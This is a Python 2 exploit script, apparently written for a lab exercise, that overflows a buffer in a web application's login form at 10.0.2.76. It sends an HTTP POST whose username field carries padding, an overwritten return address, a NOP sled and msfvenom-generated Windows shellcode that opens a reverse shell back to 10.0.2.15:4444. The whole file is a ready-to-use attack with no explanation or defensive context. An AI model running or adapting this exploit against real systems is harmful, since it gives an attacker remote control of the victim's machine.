#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b "\x00\x0A\x0D\x25\x26\x2B\x3D" EXITFUNC=thread
    shellcode = ("\xdb\xde\xbd\xc6\xe8\x9a\xba\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
    "\x52\x83\xe8\xfc\x31\x68\x13\x03\xae\xfb\x78\x4f\xd2\x14\xfe"
    "\xb0\x2a\xe5\x9f\x39\xcf\xd4\x9f\x5e\x84\x47\x10\x14\xc8\x6b"
    "\xdb\x78\xf8\xf8\xa9\x54\x0f\x48\x07\x83\x3e\x49\x34\xf7\x21"
    "\xc9\x47\x24\x81\xf0\x87\x39\xc0\x35\xf5\xb0\x90\xee\x71\x66"
    "\x04\x9a\xcc\xbb\xaf\xd0\xc1\xbb\x4c\xa0\xe0\xea\xc3\xba\xba"
    "\x2c\xe2\x6f\xb7\x64\xfc\x6c\xf2\x3f\x77\x46\x88\xc1\x51\x96"
    "\x71\x6d\x9c\x16\x80\x6f\xd9\x91\x7b\x1a\x13\xe2\x06\x1d\xe0"
    "\x98\xdc\xa8\xf2\x3b\x96\x0b\xde\xba\x7b\xcd\x95\xb1\x30\x99"
    "\xf1\xd5\xc7\x4e\x8a\xe2\x4c\x71\x5c\x63\x16\x56\x78\x2f\xcc"
    "\xf7\xd9\x95\xa3\x08\x39\x76\x1b\xad\x32\x9b\x48\xdc\x19\xf4"
    "\xbd\xed\xa1\x04\xaa\x66\xd2\x36\x75\xdd\x7c\x7b\xfe\xfb\x7b"
    "\x7c\xd5\xbc\x13\x83\xd6\xbc\x3a\x40\x82\xec\x54\x61\xab\x66"
    "\xa4\x8e\x7e\x28\xf4\x20\xd1\x89\xa4\x80\x81\x61\xae\x0e\xfd"
    "\x92\xd1\xc4\x96\x39\x28\x8f\x92\xbd\x30\x40\xcb\xbf\x34\x4f"
    "\x57\x49\xd2\x05\x77\x1f\x4d\xb2\xee\x3a\x05\x23\xee\x90\x60"
    "\x63\x64\x17\x95\x2a\x8d\x52\x85\xdb\x7d\x29\xf7\x4a\x81\x87"
    "\x9f\x11\x10\x4c\x5f\x5f\x09\xdb\x08\x08\xff\x12\xdc\xa4\xa6"
    "\x8c\xc2\x34\x3e\xf6\x46\xe3\x83\xf9\x47\x66\xbf\xdd\x57\xbe"
    "\x40\x5a\x03\x6e\x17\x34\xfd\xc8\xc1\xf6\x57\x83\xbe\x50\x3f"
    "\x52\x8d\x62\x39\x5b\xd8\x14\xa5\xea\xb5\x60\xda\xc3\x51\x65"
    "\xa3\x39\xc2\x8a\x7e\xfa\xe2\x68\xaa\xf7\x8a\x34\x3f\xba\xd6"
    "\xc6\xea\xf9\xee\x44\x1e\x82\x14\x54\x6b\x87\x51\xd2\x80\xf5"
    "\xca\xb7\xa6\xaa\xeb\x9d")

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10

    inputBuffer = filler + eip + offset + nops + shellcode

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.0.2.76\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.0.2.76/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("10.0.2.76", 80))
    s.send(buffer)

    s.close()

    print "\nDone did you get a reverse shell?"
except:
    print "\nCould not connect!"
